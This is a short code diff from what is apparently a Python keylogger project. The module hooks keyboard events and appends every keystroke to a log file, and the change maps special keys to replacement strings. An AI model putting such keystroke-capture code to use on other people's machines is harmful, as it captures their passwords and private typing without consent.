@@ -1,15 +1,16 @@
 import keyboard
 from functools import partial
 from src.static.auxiliaries import get_actual_date
+from src.static.constants import SPECIAL_KEYS
 
 def __log_key(event, filename):
     keyname = event.name
 
     with open(filename, "a") as keylog_file:
-        if keyname != 'enter':
-            keylog_file.write(keyname)
+        if keyname in SPECIAL_KEYS:
+            keylog_file.write(SPECIAL_KEYS[keyname])
         else:
-            keylog_file.write('\n')
+            keylog_file.write(keyname)
 
 # Start listening for key events
 def listen_keyboard():
